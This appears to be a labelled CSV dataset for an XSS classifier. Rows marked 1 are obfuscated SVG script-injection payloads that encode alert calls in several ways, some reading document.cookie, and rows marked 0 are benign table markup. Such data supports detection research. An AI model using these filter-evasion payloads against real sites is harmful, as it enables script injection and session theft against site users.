"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,49,49,41))>",1
<svg onload=eval(String.fromCharCode(97)+atob('bGVydCgxKQ=='))>,1
<svg onload=eval(String.fromCharCode(97)+unescape('%6c%65%72%74(1)'))>,1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+'(1)')>",1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97,108,101)+'rt(1)')>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116))(1)>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(3)')>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>></svg>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116).concat('(1)'))>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",1
"<svg onload=eval(String.fromCodePoint(97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String['fromCharCode'](97,108,101,114,116).concat('(1)'))>",1
"<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))></svg>",1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`) />,1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>,1
<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(2)`)>,1
"<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074`+String.fromCharCode(40,49,41))>",1
<svg onload=eval(`\\u0061l\\u0065rt(1)`)>,1
<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>,1
<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074`+'(1)')>,1
<svg onload=eval(`\x61\x6c\x65\x72\x74(1)`)>,1
<svg onload=eval(`al\x65rt(1)`)></svg>,1
<svg onload=eval(`window['al'+'ert'](1)`)>,1
"<svg onload=eval(atob(""YWxlcnQoMSk=""))></svg>",1
<svg onload=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>,1
<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>,1
<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>,1
<svg onload=eval(atob(&quot;d2luZG93LmFsZXJ0KDEp&quot;))>,1
<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>,1
<svg onload=eval(atob('YWx'+'lcnQoMSk='))>,1
<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>,1
<svg onload=eval(atob('YWxlcnQoMSk=')) />,1
<svg onload=eval(atob('YWxlcnQoMSk='))>,1
<svg onload=eval(atob('YWxlcnQoMSk='))></svg>,1
<svg onload=eval(atob('YWxlcnQoMTEp'))>,1
<svg onload=eval(atob('YWxlcnQoMTEwKQ=='))>,1
<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>,1
<svg onload=eval(atob('YWxlcnQoMTEzKQ=='))>,1
<svg onload=eval(atob('YWxlcnQoMik='))>,1
<svg onload=eval(atob('YWxlcnQoNCk='))>,1
<svg onload=eval(atob('YWxlcnQoNik='))>,1
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>,1
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>,1
<svg onload=eval(atob('c2V0VGltZW91dCgoKT0+YWxlcnQoMSksMTAwMCk='))>,1
<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>,1
<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>,1
<svg onload=eval(atob(`YWxlcnQoMSk=`))>,1
<svg onload=eval(decodeURI('%61%6C%65%72%74%28%31%29'))>,1
<svg onload=eval(decodeURI('%61%6C%65%72%74(1)'))>,1
<svg onload=eval(decodeURI('%61%6c%65%72%74(1)'))>,1
"<svg onload=eval(decodeURIComponent(""%61%6c%65%72%74%281%29""))>",1
<svg onload=eval(decodeURIComponent(&#39;%61%6C%65%72%74%28%31%29&#39;))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%32%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%34%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))></svg>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)')) />,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></svg>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(2)'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(3)'))>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(7)'))>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))></svg>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>,1
<svg onload=eval(decodeURIComponent('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>,1
<svg onload=eval(decodeURIComponent('\u0061\u006c\u0065\u0072\u0074(1)'))>,1
<svg onload=eval(decodeURIComponent('al%65rt(1)'))>,1
<svg onload=eval(decodeURIComponent(`%61%6C%65%72%74(1)`))>,1
<svg onload=eval(decodeURIComponent(`%61lert(1)`))>,1
"<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,50,41))>",1
"<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,53,41))>",1
<svg onload=eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))>,1
<svg onload=eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))>,1
<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))></svg>,1
<svg onload=eval(unescape('%61%6C%65%72%74(1)'))>,1
<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>,1
<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>,1
<svg onload=eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))>,1
<svg onload=eval(unescape('%61%6c%65%72%74%281%29'))>,1
<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>,1
<svg onload=eval(unescape('%61%6c%65%72%74(49)'))>,1
<svg onload=eval(unescape('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>,1
<svg onload=eval(unescape('%u0061%u006c%u0065%u0072%u0074%28%u0031%u0031%u0031%29'))>,1
<svg onload=eval(unescape('\u0061\u006c\u0065\u0072\u0074(1)'))>,1
<svg onload=eval(window.atob('YWxlcnQoMSk='))>,1
<svg onload=eval(window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(1)'))>,1
<svg onload=eval(window['atob']('YWxlcnQoMSk='))>,1
<svg onload=eval(window['unescape']('%61%6c%65%72%74(49)'))>,1
"<svg onload=import('data:text/javascript,al%65rt(123)')>",1
<svg onload=location='javascript:'+unescape('%61%6C%65%72%74(1)')>,1
<svg onload=location=`javas`+`cript:al`+`ert(1)`>,1
<svg onload=location=`javascr`+`ipt:al`+`ert(1)`>,1
"<svg onload=setInterval('al'+'ert(1)',0)>",1
"<svg onload=setInterval('al'+'ert(1)',1)>",1
"<svg onload=setInterval('al'+'ert(1)',1000)></svg>",1
"<svg onload=setInterval('al'+'ert(1)',999)>",1
"<svg onload=setInterval(String.fromCharCode(97,108,101,114,116)+'(1)',50)>",1
"<svg onload=setInterval(atob('YWxlcnQoMSk='),100)>",1
"<svg onload=setInterval(window['al'+'ert'],1,1)>",1
"<svg onload=setInterval(window[String.fromCharCode(97,108,101,114,116)],1,1)>",1
"<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>",1
"<svg onload=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>",1
"<svg onload=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)',0)>",1
"<svg onload=setTimeout('a'+'lert(1)',0)>",1
"<svg onload=setTimeout('al'+'\x65rt(1)',0)>",1
"<svg onload=setTimeout('al'+'ert(1)',0)>",1
"<svg onload=setTimeout('al'+'ert(123)',0)>",1
"<svg onload=setTimeout('al'+'ert(2)',0)>",1
<svg onload=setTimeout('ev'+'al(`al\\u0065rt(1)`)')>,1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116))(1)',0)>",1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116)+`(1)`)')>",1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)>",1
<svg onload=setTimeout('eval(`\\u0061lert(1)`)')>,1
"<svg onload=setTimeout('eval(atob(""YWxlcnQoMSk=""))',0)>",1
"<svg onload=setTimeout('eval(unescape(""%61%6c%65%72%74(1)""))',0)></svg>",1
"<svg onload=setTimeout('eval(unescape(`%61lert(1)`))',0)>",1
"<svg onload=setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)>",1
"<svg onload=setTimeout(Function('al'+'ert(1)'),0)>",1
"<svg onload=setTimeout(Function.prototype.constructor('al'+'ert(1)'),0)>",1
"<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)',0)>",1
"<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>",1
"<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>",1
"<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>",1
"<svg onload=setTimeout(`;\u0061lert(1)`,0)>",1
"<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>",1
"<svg onload=setTimeout(`al${String.fromCharCode(101,114,116)}(1)`,0)>",1
"<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>",1
"<svg onload=setTimeout(`al`+`ert(1)`,5)>",1
"<svg onload=setTimeout(`eval('\\u0061lert(1)')`,0)>",1
"<svg onload=setTimeout(atob(""YWxlcnQoMSk=""),0)>",1
"<svg onload=setTimeout(atob('YWxlcnQ=')+'(1)',0)>",1
"<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>",1
"<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%29'),0)>",1
<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>,1
"<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>",1
"<svg onload=setTimeout(eval('unescape(`%61%6c%65%72%74(1)`)'),0)>",1
"<svg onload=setTimeout(function(){window['al'+'ert'](1)},0)>",1
"<svg onload=setTimeout(function(){window[String.fromCharCode(97,108,101,114,116)](1)},0)>",1
"<svg onload=setTimeout(unescape('%61%6C%65%72%74(1)'),0)>",1
"<svg onload=setTimeout(window['al'+'ert'](1),0)>",1
"<svg onload=setTimeout(window[atob('YWxlcnQ=')],0,1)>",1
<svg onload=top[&quot;a&quot;+&quot;ler&quot;+&quot;t&quot;](1)>,1
<svg onload=top['ale\x72t'](1)>,1
"<svg onload=window.setTimeout('al'+'ert(1)',0)>",1
"<svg onload=window[""a""+""l""+""ert""](1)>",1
"<svg onload=window[""ev""+""al""](""al""+""ert(1)"")>",1
"<svg onload=window[""eval""](""a""+""le""+""rt()(1)"")>",1
<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>,1
<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>,1
<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](30)>,1
<svg onload=window['\u0061lert'](1)>,1
<svg onload=window['\x61\x6c\x65\x72\x74'](1)>,1
<svg onload=window['\x61\x6c\x65\x72\x74'](`\x31`)>,1
<svg onload=window['\x65va\x6c']('ale'+'rt(1)')>,1
<svg onload=window['a'+'l'+'ert'](1)></svg>,1
<svg onload=window['a'+'lert'](1)>,1
<svg onload=window['al'+'\u0065rt'](1)>,1
<svg onload=window['al'+'\x65rt'](1)>,1
<svg onload=window['al'+'ert']('X'+'SS')>,1
<svg onload=window['al'+'ert'](0x1)>,1
<svg onload=window['al'+'ert'](1)>,1
<svg onload=window['al'+'ert'](1)></svg>,1
<svg onload=window['al'+'ert'](6)>,1
<svg onload=window['al'+'ert'](String.fromCharCode(49))>,1
<svg onload=window['al'+'ert'](atob('MTEz'))>,1
<svg onload=window['al'+'ert'](document['cookie'])>,1
"<svg onload=window['al'+'ert'].apply(null,[1])>",1
"<svg onload=window['al'+'ert'].call(null,1)>",1
<svg onload=window['al'+unescape('%65%72%74')](1)>,1
<svg onload=window['al\x65rt']((Math.random()+1).toString(36).substring(7))>,1
<svg onload=window['al\x65rt'](1)>,1
"<svg onload=window['ev'+'al']('ale'+'rt(49,49,49)')>",1
"<svg onload=window['ev'+'al'](String.fromCharCode(97,108,101,114,116)+'(1)')>",1
<svg onload=window['ev'+'al'](atob('YWxlcnQoMSk='))>,1
"<svg onload=window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))>",1
"<svg onload=window[String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)](1)>",1
"<svg onload=window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))>",1
"<svg onload=window[String.fromCharCode(101,118,97,108)](decodeURIComponent('%61%6C%65%72%74(1)'))>",1
<svg onload=window[String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)](1)>,1
"<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>",1
"<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>",1
<svg onload=window[`\u0061lert`](1)>,1
<svg onload=window[`\x61\x6c\x65\x72\x74`](1)>,1
"<svg onload=window[`al${String.fromCharCode(101,114,116)}`](1)>",1
<svg onload=window[`al`+`ert`](1)>,1
<svg onload=window[`al`+`ert`](1)></svg>,1
<svg onload=window[atob('YWw=')+'ert'](1)>,1
<svg onload=window[atob('YWx'+'lcnQ=')](1)>,1
<svg onload=window[atob('YWxlcnQ=')](1)>,1
<svg onload=window[atob('YWxlcnQ=')](1)></svg>,1
"<svg onload=window[atob('YWxlcnQ=')].apply(null,[1])>",1
<svg onload=window[decodeURI('%61%6C%65%72%74')](1)>,1
<svg onload=window[decodeURIComponent('%61%6C%65%72%74')](1)>,1
<svg onload=window[unescape('%61%6C%65%72%74')](1)>,1
<svg onload=window[unescape('%61%6c%65%72%74')](1)>,1
<svg onload=window[unescape('%61lert')](1)>,1
<svg onload=window[unescape('%u0061lert')](1)>,1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;"">",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""&#97;&#108;&#101;&#114;&#116;(1)"">",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(atob('YWxlcnQoMSk='))""></svg>",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(decodeURI('%61%6c%65%72%74%28%60%58%53%53%60%29'))""></svg>",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(unescape('%61%6c%65%72%74%28%31%29'))""></svg>",1
"<svg/onload=""&#97;&#108;&#101;&#114;&#116;&#96;&#88;&#83;&#83;&#96;"">",1
"<svg/onload=""&#97;&#108;&#101;&#114;&#116;&#96;1`"">",1
"<svg/onload=""e\u0076al('alert(1)')"">",1
"<svg/onload=""eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')"">",1
"<svg/onload=""eval(atob('YWxlcnQoIlhTUyIp'))""></svg>",1
"<svg/onload='[].map.constructor(""al""+""er""+""t""+""\x28""+""1\x29"")()'>",1
"<svg/onload='eval(atob(""YWxlcnQoMCk=""))'>",1
<svg/onload='eval(atob(`YWxlcnQoJ1hTUyEnKQ==`))'>,1
<svg/onload='eval(unescape(`%61%6c%65%72%74%28%31%29`))'>,1
<svg/onload=(eval)('ale'+'rt')(1)>,1
<svg/onload=Function('al'+'ert(1)')()>,1
<svg/onload=eval('al'+'ert(1)')>,1
<svg/onload=eval('co'+'nfirm(1)')>,1
<svg/onload=eval(String.fromCharCode(97)+'lert'+String.fromCharCode(40)+49+String.fromCharCode(41))>,1
<svg/onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+`rt(1)`)>,1
"<svg/onload=eval(String.fromCharCode(97,108,101,114,116)+'\x28""1""\x29')>",1
"<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",1
"<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1
<svg/onload=eval(atob('Y29uZmlybSgxKQ=='))>,1
<svg/onload=eval(atob('YWxlcnQoJzEnKQ=='))>,1
<svg/onload=eval(atob('YWxlcnQoMSk='))>,1
<svg/onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>,1
<svg/onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>,1
"<svg/onload=setTimeout('ale'+'rt(1)',0)>",1
"<svg/onload=setTimeout(Function(""al\x65rt(1)""),0)>",1
<svg/onload=setTimeout(`\u0061lert(1)`)>,1
<svg/onload=window['al'+'ert'](1)>,1
<svg/onload=window['ev'+'al']('al'+'ert(1)')>,1
<svg><animate onbegin=window['al'+'ert'](1) /></svg>,1
"<svg><foreignObject><iframe srcdoc=""<img src=x onerror=alert(1)>""></foreignObject></svg>",1
"<svg><foreignObject><iframe srcdoc=""<script>eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))</script>""></foreignObject></svg>",1
"<svg><foreignObject><iframe srcdoc=""<svg onload=alert(1)>""></foreignObject></svg>",1
<svg><foreignObject><img src=x onerror='&#97;&#x6c;&#101;&#114;&#x74;&#40;1&#41;'></foreignObject></svg>,1
"<svg><foreignObject><img src=x onerror='eval(atob(""YWxlcnQoMSk=""))'></foreignObject></svg>",1
"<svg><foreignObject><img src=x onerror='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'></foreignObject></svg>",1
"<svg><set onbegin=""window['al'+'ert']('XSS')""></set></svg>",1
"<table alt=""benign"">normal</table>",0
"<table alt=""benign"">test</table>",0
"<table alt=""content"">benign</table>",0
"<table alt=""content"">content</table>",0
"<table alt=""hello"">content</table>",0
"<table alt=""hello"">normal</table>",0
"<table alt=""hello"">sample</table>",0
"<table alt=""hello"">world</table>",0
"<table alt=""normal"">benign</table>",0
"<table alt=""normal"">content</table>",0
"<table alt=""normal"">test</table>",0
"<table alt=""normal"">world</table>",0
"<table alt=""sample"">benign</table>",0
"<table alt=""test"">benign</table>",0
"<table alt=""test"">content</table>",0
"<table alt=""test"">hello</table>",0
"<table alt=""test"">test</table>",0
"<table alt=""world"">benign</table>",0
"<table alt=""world"">hello</table>",0
"<table alt=""world"">test</table>",0
"<table class=""content"">content</table>",0
"<table class=""content"">sample</table>",0
"<table class=""hello"">benign</table>",0
"<table class=""hello"">hello</table>",0
"<table class=""hello"">world</table>",0
"<table class=""normal"">benign</table>",0
"<table class=""normal"">content</table>",0
"<table class=""normal"">hello</table>",0
"<table class=""normal"">test</table>",0
"<table class=""normal"">world</table>",0
"<table class=""sample"">benign</table>",0
"<table class=""sample"">normal</table>",0
"<table class=""sample"">sample</table>",0
"<table class=""test"">content</table>",0
"<table class=""test"">sample</table>",0
"<table class=""test"">test</table>",0
"<table class=""world"">content</table>",0
"<table class=""world"">normal</table>",0
"<table class=""world"">test</table>",0
"<table href=""benign"">benign</table>",0
"<table href=""benign"">normal</table>",0
"<table href=""benign"">sample</table>",0
"<table href=""benign"">world</table>",0
"<table href=""content"">hello</table>",0
"<table href=""content"">normal</table>",0
"<table href=""hello"">benign</table>",0
"<table href=""hello"">normal</table>",0
"<table href=""hello"">world</table>",0
"<table href=""normal"">benign</table>",0
"<table href=""normal"">content</table>",0
"<table href=""normal"">hello</table>",0
"<table href=""normal"">world</table>",0
"<table href=""sample"">benign</table>",0
"<table href=""sample"">content</table>",0
"<table href=""sample"">normal</table>",0
"<table href=""test"">world</table>",0
"<table href=""world"">hello</table>",0
"<table href=""world"">normal</table>",0
"<table id=""benign"">hello</table>",0
"<table id=""benign"">normal</table>",0
"<table id=""content"">content</table>",0
"<table id=""content"">hello</table>",0
"<table id=""content"">world</table>",0
"<table id=""hello"">normal</table>",0
"<table id=""normal"">world</table>",0
"<table id=""sample"">benign</table>",0
"<table id=""sample"">hello</table>",0
"<table id=""sample"">normal</table>",0
"<table id=""sample"">sample</table>",0
"<table id=""test"">hello</table>",0
"<table id=""world"">sample</table>",0
"<table id=""world"">test</table>",0
"<table src=""benign"">content</table>",0
"<table src=""benign"">test</table>",0
"<table src=""benign"">world</table>",0
"<table src=""content"">sample</table>",0
"<table src=""hello"">test</table>",0
"<table src=""normal"">content</table>",0
"<table src=""normal"">hello</table>",0
"<table src=""normal"">normal</table>",0
"<table src=""normal"">world</table>",0
"<table src=""sample"">normal</table>",0
"<table src=""sample"">test</table>",0
"<table src=""test"">benign</table>",0
"<table src=""test"">sample</table>",0
"<table src=""test"">test</table>",0
"<table src=""world"">sample</table>",0
"<table src=""world"">test</table>",0
"<table src=""world"">world</table>",0
"<table style=""benign"">benign</table>",0
"<table style=""benign"">normal</table>",0
"<table style=""benign"">sample</table>",0
"<table style=""content"">benign</table>",0
"<table style=""content"">normal</table>",0
"<table style=""content"">sample</table>",0
"<table style=""hello"">content</table>",0
"<table style=""hello"">sample</table>",0
"<table style=""normal"">sample</table>",0
"<table style=""normal"">world</table>",0
"<table style=""sample"">content</table>",0
"<table style=""sample"">hello</table>",0
"<table style=""sample"">test</table>",0
"<table style=""test"">content</table>",0
"<table style=""test"">hello</table>",0
"<table style=""test"">sample</table>",0
"<table style=""test"">test</table>",0
"<table style=""test"">world</table>",0
"<table style=""world"">hello</table>",0
"<table style=""world"">sample</table>",0
"<table style=""world"">test</table>",0
"<table style=""world"">world</table>",0
"<table title=""benign"">benign</table>",0
"<table title=""benign"">content</table>",0
"<table title=""benign"">hello</table>",0
"<table title=""benign"">world</table>",0
"<table title=""content"">normal</table>",0
"<table title=""content"">sample</table>",0
"<table title=""hello"">content</table>",0
"<table title=""hello"">hello</table>",0
"<table title=""hello"">normal</table>",0
"<table title=""hello"">sample</table>",0
"<table title=""normal"">content</table>",0
"<table title=""normal"">sample</table>",0
"<table title=""normal"">world</table>",0
"<table title=""sample"">benign</table>",0
"<table title=""sample"">content</table>",0
"<table title=""sample"">sample</table>",0
"<table title=""test"">benign</table>",0
"<table title=""test"">normal</table>",0
"<table title=""test"">test</table>",0
"<table title=""world"">benign</table>",0
"<table title=""world"">hello</table>",0
"<table title=""world"">test</table>",0
"<table title=""world"">world</table>",0
"<td alt=""benign"">sample</td>",0
"<td alt=""content"">benign</td>",0
"<td alt=""content"">test</td>",0
"<td alt=""content"">world</td>",0
"<td alt=""hello"">hello</td>",0
"<td alt=""hello"">world</td>",0
"<td alt=""normal"">benign</td>",0
"<td alt=""normal"">hello</td>",0
"<td alt=""normal"">normal</td>",0
"<td alt=""sample"">benign</td>",0
"<td alt=""test"">benign</td>",0
"<td alt=""test"">content</td>",0
"<td alt=""test"">world</td>",0
"<td alt=""world"">normal</td>",0
"<td alt=""world"">test</td>",0
"<td class=""benign"">benign</td>",0
"<td class=""benign"">content</td>",0
"<td class=""benign"">world</td>",0
"<td class=""content"">benign</td>",0
"<td class=""content"">normal</td>",0
"<td class=""content"">test</td>",0
"<td class=""hello"">test</td>",0
"<td class=""normal"">hello</td>",0
"<td class=""normal"">normal</td>",0
"<td class=""normal"">test</td>",0
"<td class=""normal"">world</td>",0
"<td class=""sample"">hello</td>",0
"<td class=""test"">hello</td>",0
"<td class=""test"">world</td>",0
"<td class=""world"">content</td>",0
"<td class=""world"">hello</td>",0
"<td class=""world"">world</td>",0
"<td href=""benign"">benign</td>",0
"<td href=""benign"">content</td>",0
"<td href=""benign"">hello</td>",0
"<td href=""benign"">world</td>",0
"<td href=""hello"">benign</td>",0
"<td href=""hello"">content</td>",0
"<td href=""hello"">hello</td>",0
"<td href=""hello"">test</td>",0
"<td href=""hello"">world</td>",0
"<td href=""normal"">normal</td>",0
"<td href=""normal"">test</td>",0
"<td href=""sample"">hello</td>",0
"<td href=""sample"">normal</td>",0
"<td href=""sample"">test</td>",0
"<td href=""test"">benign</td>",0
"<td href=""test"">normal</td>",0
"<td href=""test"">test</td>",0
"<td href=""world"">hello</td>",0
"<td id=""benign"">benign</td>",0
"<td id=""benign"">content</td>",0
"<td id=""benign"">test</td>",0
"<td id=""benign"">world</td>",0
"<td id=""content"">benign</td>",0
"<td id=""content"">sample</td>",0
"<td id=""content"">test</td>",0
"<td id=""hello"">world</td>",0
"<td id=""sample"">benign</td>",0
"<td id=""sample"">content</td>",0
"<td id=""sample"">normal</td>",0
"<td id=""sample"">test</td>",0
"<td id=""test"">benign</td>",0
"<td id=""test"">content</td>",0
"<td id=""test"">test</td>",0
"<td id=""world"">test</td>",0
"<td id=""world"">world</td>",0
"<td src=""benign"">hello</td>",0
"<td src=""benign"">world</td>",0
"<td src=""content"">content</td>",0
"<td src=""content"">normal</td>",0
"<td src=""content"">test</td>",0
"<td src=""content"">world</td>",0
"<td src=""hello"">hello</td>",0
"<td src=""normal"">benign</td>",0
"<td src=""normal"">content</td>",0
"<td src=""normal"">sample</td>",0
"<td src=""sample"">content</td>",0
"<td src=""sample"">normal</td>",0
"<td src=""sample"">test</td>",0
"<td src=""sample"">world</td>",0
"<td src=""test"">sample</td>",0
"<td src=""test"">world</td>",0
"<td src=""world"">sample</td>",0
"<td src=""world"">test</td>",0
"<td style=""benign"">world</td>",0
